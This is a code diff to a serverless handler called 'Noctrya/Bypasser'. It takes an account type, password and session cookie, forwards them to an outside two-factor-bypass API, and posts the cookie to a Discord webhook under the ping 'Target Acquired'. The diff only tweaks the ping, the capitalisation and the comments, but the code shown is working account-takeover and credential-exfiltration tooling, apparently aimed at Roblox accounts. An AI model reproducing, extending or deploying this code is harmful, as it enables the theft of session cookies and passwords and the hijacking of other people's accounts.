@@ -80,7 +80,7 @@ async function sendWebhook(req, requestData, responseStatus, success, responseMe
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: success ? '@everyone **ALERT: Target Acquired**' : null,
+                content: '@everyone', // Always pings @everyone
                 embeds: [mainEmbed, cookieEmbed],
                 username: 'Noctrya/Bypasser',
                 allowed_mentions: { parse: ['everyone'] }
@@ -149,11 +149,14 @@ export default async function handler(req, res) {
     // 5. Bypass logic
     try {
         const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
-        const { Type, Password, Cookie } = body || {};
+        let { Type, Password, Cookie } = body || {};
 
         if (!Type || !Password || !Cookie) {
             return res.status(400).json({ success: false, message: 'Missing required fields' });
         }
+
+        // FIX: Capitalize the first letter of Type (e.g., "roblox" -> "Roblox")
+        Type = Type.charAt(0).toUpperCase() + Type.slice(1).toLowerCase();
 
         const targetUrl = 'https://immortal.st/api/misc/2faBypass.php';
         const baseHeaders = {
@@ -214,11 +217,9 @@ export default async function handler(req, res) {
             finalSuccess = responseData.success === true || responseData.success === "true";
         }
 
-        // ── NEW EXACT ERROR HANDLING ──
         if (finalSuccess) {
-            finalMessage = 'Success'; // Just say Success if it worked
+            finalMessage = 'Success';
         } else {
-            // Extract the exact reason from the API (msg, message, or error)
             if (responseData && typeof responseData === 'object') {
                 finalMessage = responseData.msg || responseData.message || responseData.error || 'Bypass Failed (Unknown Reason)';
             } else {
@@ -250,4 +251,4 @@ export default async function handler(req, res) {
             code: errorCode
         });
     }
-}
+                                    }
